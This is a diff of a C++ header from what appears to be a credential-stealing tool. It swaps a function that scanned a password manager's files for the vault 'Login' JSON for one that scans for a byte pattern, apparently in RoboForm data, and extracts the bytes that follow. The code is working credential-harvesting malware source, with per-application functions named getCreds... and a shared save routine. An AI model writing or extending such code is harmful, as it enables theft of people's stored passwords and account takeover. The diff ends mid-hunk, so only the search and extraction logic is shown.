@@ -1,11 +1,10 @@
 #pragma once
 #include <iostream>
 #include <fstream>
-#include <string>
 #include <vector>
 #include "../../core/saveFile.h"
 
-int getCredspasswarden(std::string filename) {
+int getCredsroboformapp2(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
@@ -13,17 +12,17 @@ int getCredspasswarden(std::string filename) {
         return 1;
     }
 
-    std::string searchKeyword = "\"components\":{\"title\":\"Login\",\"vault\":";
-    std::string foundData;
+    std::vector<unsigned char> searchPattern = { 0x88, 0x10, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00 };
+    std::vector<unsigned char> foundData;
 
     while (!file.eof()) {
-        char c;
-        file.get(c);
+        unsigned char c;
+        file.read(reinterpret_cast<char*>(&c), sizeof(c));
 
-        if (c == searchKeyword[foundData.size()]) {
-            foundData += c;
-            if (foundData == searchKeyword) {
-                // We found the search keyword, now collect data until 10 binary spaces (00) are found
+        if (c == searchPattern[foundData.size()]) {
+            foundData.push_back(c);
+            if (foundData.size() == searchPattern.size()) {
+                // We found the search pattern, now collect data until having four binary spaces (00)
                 std::vector<unsigned char> extractedData;
                 int consecutiveSpaces = 0;
 
@@ -31,9 +30,8 @@ int getCredspasswarden(std::string filename) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
                     if (c == 0x00) {
                         consecutiveSpaces++;
-                        if (consecutiveSpaces == 10) {
-                            break; // 10 consecutive binary spaces found
-                            // We can check for more spaces if we want
+                        if (consecutiveSpaces == 4) {
+                            break; // (00) found
                         }
                     }
                     else {
